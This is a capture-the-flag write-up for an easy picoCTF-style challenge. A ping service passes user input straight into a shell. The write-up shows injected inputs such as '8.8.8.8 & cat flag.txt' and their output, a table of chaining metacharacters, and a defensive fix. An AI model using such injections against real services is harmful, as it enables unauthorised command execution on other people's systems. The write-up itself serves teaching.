---
title: ping-cmd
event: cylabacademy
category: general-skills
points:
difficulty: easy
date: 2026-08-19
tags: [command-injection, netcat, shell-metacharacters]
status: published
---

# ping-cmd

> **Event:** cylabacademy · **Category:** general-skills

## Challenge

A network service prompts for an IP to ping, claiming it "only allows
`8.8.8.8`". It doesn't validate the input — it drops it straight into a shell
`ping` command, so a metacharacter runs commands of your choosing.

```bash
nc mysterious-sea.picoctf.net 59148
```

## TL;DR

The input is substituted into something like `ping -c 2 <input>`. Append
`& ls` to run a second command after ping: `8.8.8.8 & ls` lists the directory,
`8.8.8.8 & cat flag.txt` reads the flag.

## Approach

### 1. Confirm it actually pings

```
Enter an IP address: 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=12.8 ms
```

Real ping output, so the input reaches a shell `ping` invocation. The claim about
"tight security" is the hint that there isn't any.

### 2. Break out with a metacharacter

```
Enter an IP address: 8.8.8.8 & ls
flag.txt
script.sh
```

`&` runs `ping ... 8.8.8.8` and then `ls` as a separate command. `flag.txt` is
right there.

<details>
<summary>What didn't work here</summary>

**Tried:** `ls` on its own.

**Why it failed:** with nothing to break out of the ping command, the input is
just an argument — the server runs `ping ... ls` and tries to resolve `ls` as a
hostname, which hangs until `^C`. You can't run a command until you first
*terminate* the ping, which is what the metacharacter does.

**Tried:** `8.8.8.8 | 1.1.1.1`.

**Why it failed:** `|` does chain a command, but it pipes ping's output *into*
whatever follows — and `1.1.1.1` isn't a command. `| ls` would have worked; a
second IP never could. The pipe wasn't the problem, the thing after it was.

</details>

### 3. Read the flag

```
Enter an IP address: 8.8.8.8 & cat flag.txt
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_...}
```

## Flag

```
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_...}
```

_Truncated — graded course._

## Learn more

This is classic **command injection**: user input concatenated into a shell
command with no sanitisation. The shell metacharacters that chain or terminate a
command are the whole attack surface:

| | Behaviour |
| --- | --- |
| `;` | run the next command unconditionally |
| `&` | run ping in the background, then the next command immediately |
| `&&` | run the next command only if ping succeeds |
| `\|` | pipe ping's **output** into the next command |
| `` `cmd` `` / `$(cmd)` | substitute a command's output inline |

The two failed attempts map to two different mistakes. `ls` alone forgot that the
input needs to *escape* the ping command before anything else runs. `| 1.1.1.1`
picked a chaining operator but fed it data instead of a command. Both are worth
internalising because they're the usual first stumbles: knowing an injection
exists isn't the same as choosing the operator that does what you want.

The real fix, on the defensive side, is never to build the command by string
concatenation — pass the IP as an argument vector and validate it against an
actual IP-address pattern first.

## Tools

`nc`
